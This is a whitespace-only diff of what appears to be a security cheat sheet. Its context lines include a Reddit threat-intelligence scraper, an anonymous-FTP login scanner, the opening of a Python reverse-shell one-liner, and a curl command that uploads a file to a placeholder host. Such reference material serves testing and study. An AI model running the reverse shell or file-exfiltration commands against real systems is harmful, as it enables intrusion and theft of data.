@@ -192,11 +192,11 @@ Enumerate new Reddit comments for threat intelligence. This script can be modifi
 
 import praw
 
-reddit = praw.Reddit(client_id ='xxxxxxxxxxxxxxx', 
-                     client_secret ='xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', 
-                     user_agent ='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 
-                     username ='username', 
-                     password ='pass') 
+reddit = praw.Reddit(client_id ='xxxxxxxxxxxxxxx',
+                     client_secret ='xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
+                     user_agent ='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                     username ='username',
+                     password ='pass')
 
 
 for comment in reddit.subreddit('hacking+infosec+redteamsec+cybersecurity+netsec+hackernews+malware+blueteamsec').stream.comments():
@@ -230,9 +230,9 @@ for item in r:
     item = item.strip()
     print("[+] Connecting to: %s \n" %item)
     try:
-        ftp = FTP(item, timeout=3) 
+        ftp = FTP(item, timeout=3)
         ftp.login()
-       
+
         if ftp.retrlines('LIST') != 0:
             print("[+] Anonymous login enabled on Host: %s \n" %item)
             print("="*70+"\n")
@@ -285,11 +285,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 # Listen to files
 python3 -m pip install --user uploadserver
 python3 -m uploadserver
-# With basic auth: 
+# With basic auth:
 # python3 -m uploadserver --basic-auth hello:world
 
 # Send a file
-curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
+curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
